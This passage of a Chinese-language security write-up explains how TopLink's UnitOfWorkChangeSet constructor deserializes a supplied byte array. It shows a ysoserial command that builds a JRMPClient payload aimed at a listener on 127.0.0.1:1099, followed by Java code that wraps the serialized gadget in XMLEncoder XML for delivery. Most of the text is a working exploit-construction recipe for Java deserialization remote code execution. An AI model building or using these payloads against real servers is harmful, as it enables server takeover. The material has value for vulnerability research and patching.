根据源码来看，构造方法就是将一个传入的 byte 数组再反序列化成 `IdentityHashtable`对象。

> http://kickjava.com/src/oracle/toplink/essentials/internal/sessions/UnitOfWorkChangeSet.java.htm

那么利用方式就很明显了：通过传入payload对象的字节码对象来反序列化。

这里我用ysoserial生成一个payload

> java -jar ysoserial-master-ff59523eb6-1.jar JRMPClient "127.0.0.1:1099" > E:/1.txt

然后再读取文件反序列化成java对象，再读取他的字节码，最后让xmlEncoder转成 xml格式。

```
1.  `/**`
    
2.  ` * @author 浅蓝`
    
3.  ` * @since 2019/4/24 12:09`
    
4.  ` */`
    
5.  `public class Test {`
    
6.  
    
7.  `    public static void main(String[] args) throws Exception {`
    
8.  
    
9.  `        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("E:/exp.txt"));`
    
10.  `        Object o = objectInputStream.readObject();`
     
11.  
     
12.  `        byte[] bytes = objectToByte(o);`
     
13.  
     
14.  `        objectXmlEncoder(bytes , "E:/123.xml");`
     
15.  
     
16.  `    }`
     
17.  
     
18.  `    private static byte[] objectToByte(Object obj) {`
     
19.  `        byte[] bytes = null;`
     
20.  `        try {`
     
21.  `            ByteArrayOutputStream bo = new ByteArrayOutputStream();`
     
22.  `            ObjectOutputStream oo = new ObjectOutputStream(bo);`
     
23.  `            oo.writeObject(obj);`
     
24.  
     
25.  `            bytes = bo.toByteArray();`
     
26.  
     
27.  `            bo.close();`
     
28.  `            oo.close();`
     
29.  `        } catch (Exception e) {`
     
30.  `            System.out.println("translation" + e.getMessage());`
     
31.  `            e.printStackTrace();`
     
32.  `        }`
     
33.  `        return bytes;`
     
34.  `    }`
     
35.  
     
36.  `    public static void objectXmlEncoder(Object obj,String fileName)`
     
37.  `            throws FileNotFoundException,IOException,Exception`
     
38.  `    {`
     
39.  
     
40.  
     
41.  `        java.io.File file = new java.io.File(fileName);`
     
42.  `        if(!file.exists()){`
     
43.  `            file.createNewFile();`
     
44.  `        }`
     
45.  
     
46.  
     
47.  
     
48.  `        java.io.BufferedOutputStream oop = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file));`
     
49.  `        java.beans.XMLEncoder xe = new java.beans.XMLEncoder(oop);`
     
50.  `        xe.flush();`
     
51.  `        xe.writeObject(obj);`
     
52.  `        xe.close();`
     
53.  `        oop.close();`
     
54.  `    }`
     
55.  
     
56.  `}`
     
```
